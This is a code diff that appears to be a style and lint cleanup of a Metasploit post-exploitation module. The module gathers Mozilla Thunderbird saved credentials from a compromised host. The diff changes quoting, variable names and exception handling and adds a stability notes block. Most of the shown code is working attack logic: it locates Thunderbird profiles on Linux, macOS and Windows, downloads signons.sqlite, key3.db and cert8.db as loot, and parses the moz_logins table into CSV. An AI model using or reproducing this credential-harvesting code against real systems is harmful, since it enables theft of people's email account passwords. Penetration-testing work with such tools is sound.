@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => "Multi Gather Mozilla Thunderbird Signon Credential Collection",
+        'Name' => 'Multi Gather Mozilla Thunderbird Signon Credential Collection',
         'Description' => %q{
           This module will collect credentials from Mozilla Thunderbird by downloading
           the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Post
         'Author' => [
           'sinn3r', # Metasploit
         ],
-        'Platform' => %w{linux osx win},
+        'Platform' => %w[linux osx win],
         'SessionTypes' => ['meterpreter', 'shell'],
         'Compat' => {
           'Meterpreter' => {
@@ -38,6 +38,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -53,18 +58,18 @@ class MetasploitModule < Msf::Post
     # Initialize Thunderbird's base path based on the platform
     case session.platform
     when 'linux'
-      user = session.shell_command("whoami").chomp
+      user = session.shell_command('whoami').chomp
       base = "/home/#{user}/.thunderbird/"
     when 'osx'
-      user = session.shell_command("whoami").chomp
+      user = session.shell_command('whoami').chomp
       base = "/Users/#{user}/Library/Thunderbird/Profiles/"
     when 'windows'
       if session.type == 'meterpreter'
         user_profile = session.sys.config.getenv('APPDATA')
       else
-        user_profile = cmd_exec("echo %APPDATA%").strip
+        user_profile = cmd_exec('echo %APPDATA%').strip
       end
-      base = user_profile + "\\Thunderbird\\Profiles\\"
+      base = user_profile + '\\Thunderbird\\Profiles\\'
     end
 
     # Now we have the path for Thunderbird, we still need to enumerate its
@@ -76,7 +81,7 @@ class MetasploitModule < Msf::Post
     profiles.each do |profile|
       next if profile =~ /^\./
 
-      slash = (session.platform == 'windows') ? "\\" : "/"
+      slash = (session.platform == 'windows') ? '\\' : '/'
       p = base + profile + slash
 
       # Download the database, and attempt to process the content
@@ -89,22 +94,22 @@ class MetasploitModule < Msf::Post
   # The routine will attempt to parse the sqlite db if the PARSE option is true,
   # and that SQLite3 is installed on the user's box.
   #
-  def download_loot(p)
+  def download_loot(path)
     # These are the files we wanna grab for the directory for future decryption
     files = ['signons.sqlite', 'key3.db', 'cert8.db']
 
     files.each do |item|
       loot = ''
 
-      # Downaload the file
+      # Download the file
+      # # @todo replace this with `Msf::Post::File.read_file`
       if session.type == 'meterpreter'
-        vprint_status("Downloading: #{p + item}")
+        vprint_status("Downloading: #{path + item}")
         begin
-          f = session.fs.file.new(p + item, 'rb')
-          until f.eof?
-            loot << f.read
-          end
-        rescue ::Exception => e
+          f = session.fs.file.new(path + item, 'rb')
+          loot << f.read until f.eof?
+        rescue StandardError => e
+          vprint_error(e.message)
         ensure
           f.close
         end
@@ -112,7 +117,7 @@ class MetasploitModule < Msf::Post
         cmd_show = (session.platform == 'windows') ? 'type' : 'cat'
         # The type command will add a 0x0a character in the file?  Pff.
         # Gotta lstrip that.
-        loot = cmd_exec(cmd_show, "\"#{p + item}\"").lstrip
+        loot = cmd_exec(cmd_show, "\"#{path + item}\"").lstrip
         next if loot =~ /system cannot find the file specified|No such file/
       end
 
@@ -120,7 +125,7 @@ class MetasploitModule < Msf::Post
       ext = ::File.extname(item)
       ext = ext[1, ext.length]
 
-      path = store_loot(
+      loot_path = store_loot(
         "tb.#{item}",
         "binary/#{ext}",
         session,
@@ -129,26 +134,27 @@ class MetasploitModule < Msf::Post
         "Thunderbird Raw File #{item}"
       )
 
-      print_status("#{item} saved in #{path}")
+      print_status("#{item} saved in #{loot_path}")
 
       # Parse signons.sqlite
-      if item =~ /signons\.sqlite/ and datastore['PARSE']
-        print_status("Parsing signons.sqlite...")
-        data_tbl = parse(path)
-        if data_tbl.nil? or data_tbl.rows.empty?
-          print_status("No data parsed")
-        else
-          path = store_loot(
-            "tb.parsed.#{item}",
-            "text/plain",
-            session,
-            data_tbl.to_csv,
-            "thunderbird_parsed_#{item}",
-            "Thunderbird Parsed File #{item}"
-          )
-          print_status("Parsed signons.sqlite saved in: #{path}")
-        end
+      next unless item =~ (/signons\.sqlite/) && datastore['PARSE']
+
+      print_status('Parsing signons.sqlite...')
+      data_tbl = parse(loot_path)
+      if data_tbl.nil? || data_tbl.rows.empty?
+        print_status('No data parsed')
+        next
       end
+
+      loot_path = store_loot(
+        "tb.parsed.#{item}",
+        'text/plain',
+        session,
+        data_tbl.to_csv,
+        "thunderbird_parsed_#{item}",
+        "Thunderbird Parsed File #{item}"
+      )
+      print_status("Parsed signons.sqlite saved in: #{loot_path}")
     end
   end
 
@@ -169,9 +175,9 @@ class MetasploitModule < Msf::Post
     # Load the database
     db = SQLite3::Database.new(file)
     begin
-      columns, *rows = db.execute('select * from moz_logins')
-    rescue ::Exception => e
-      print_error("doh! #{e.to_s}")
+      _, *rows = db.execute('select * from moz_logins')
+    rescue StandardError => e
+      print_error("doh! #{e}")
       return nil
     ensure
       db.close
@@ -230,7 +236,7 @@ class MetasploitModule < Msf::Post
         next if session.platform == 'windows' && line !~ /<DIR>((.+)\.(\w+)$)/
         next if (session.platform == 'linux' || session.platform == 'osx') && line !~ /(\w+\.\w+)/
 
-        tb_profiles << $1 if not $1.nil?
+        tb_profiles << ::Regexp.last_match(1) if !::Regexp.last_match(1).nil?
       end
     end
     return tb_profiles
